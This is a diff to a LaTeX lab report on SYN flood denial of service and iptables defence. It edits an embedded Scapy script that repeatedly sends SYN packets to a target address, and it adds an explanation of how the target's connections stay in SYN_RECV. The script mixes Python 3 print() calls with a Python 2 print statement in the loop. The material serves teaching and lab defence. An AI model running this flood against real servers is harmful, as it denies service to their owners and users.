@@ -179,34 +179,41 @@ This script is based on the original created by \href{https://github.com/subodhp
 \begin{lstlisting}
 
 #! /usr/bin/env python
-# Name : Subodh Pachghare
-# CyberSpace Name : HaX0R (Cyberninja)
-# Website : www.thesubodh.com
-# Description : SYN Flood Packet creation for iptables prevention solution
 import sys
 from scapy.all import *
-#conf.verb=0
-print "Field Values of packet sent"
-p=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
+print("Field Values of malformed packet sent")
+# Create malformed packet
+p = IP(dst = sys.argv[1], id = 1111, ttl = 99)/TCP(sport = RandShort(), dport=80, seq = 12345, ack = 1000, window = 1000, flags = "S")
 ls(p)
-print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
-ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
-print "Summary of answered & unanswered packets"
+print("Sending Packets in 0.3 second intervals for timeout of 4 sec")
+ans, unans = srloop(p, inter = 0.3, retry = 2, timeout=4)
+print("Summary of answered packets")
 ans.summary()
+print("---------------------------")
+print("Summary of unanswered packets")
 unans.summary()
-print "source port flags in response"
-#for s,r in ans:
-# print r.sprintf("%TCP.sport% \t %TCP.flags%")
-ans.make\_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+print("source port flags in response")
+for s,r in ans:
+    print r.sprintf("%TCP.sport% \t %TCP.flags%")
 
 \end{lstlisting}
 
-\section{Conclusion}\index{}
+\vspace{5mm}
+
+Let's take a look at some of the details of the malformed packet: the destination address of the packet is passed as a parameter, it will be the address of the victim server (virtual machine). The source port is randomly generated using the RandShort() function. Lastly, the TCP flags are set to "S", in order to send a SYN packet.\vspace{5mm}
+
+We will also use the method srloop() which sends a packet and continues to resend it after each response is received. This method returns a tuple of answered and unanswered packets, we will print a summary of those packets, too, so we can see the response of the target server.\vspace{5mm}
+
+To end, printing the flag of the response packets allows us to check that the target replies are SYN-ACK (SA) responses.\vspace{5mm}
+
+This SA shows that the server “thinks” the ACK from attacker was lost, so it keeps re-sending it. The connection on the target server remains in the SYN\_RECV state for 3 minutes for each port, as per the \href{https://sysctl-explorer.net/net/ipv4/tcp\_synack\_retries/}{net.ipv4.tcp\_synack\_retries} parameter, whose default value is set to 5 in Linux. After these retries, the kernel closes the connection.\vspace{5mm}
+
+\section{Conclusion}
 
 
 \clearpage
 
-\section{References and bibliography}\index{}
+\section{References and bibliography}
 
 \url{https://www.owasp.org/index.php/Denial\_of\_Service}\break
 \url{https://resources.sei.cmu.edu/asset\_files/WhitePaper/1996\_019\_001\_496172.pdf#page=123}\break
@@ -217,6 +224,8 @@ ans.make\_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t 
 \url{https://condor.depaul.edu/glancast/443class/docs/vbox\_host-only\_setup.html}\break
 \url{https://kerneltalks.com/networking/basics-of-iptables-linux-firewall/}\break
 \url{https://www.netfilter.org/projects/iptables/index.html}\break
+\url{https://thepacketgeek.com/scapy-p-06-sending-and-receiving-with-scapy/}\break
+\url{https://sysctl-explorer.net/net/ipv4/tcp\_synack\_retries/}\break
 
 %----------------------------------------------------------------------------------------
 \printindex
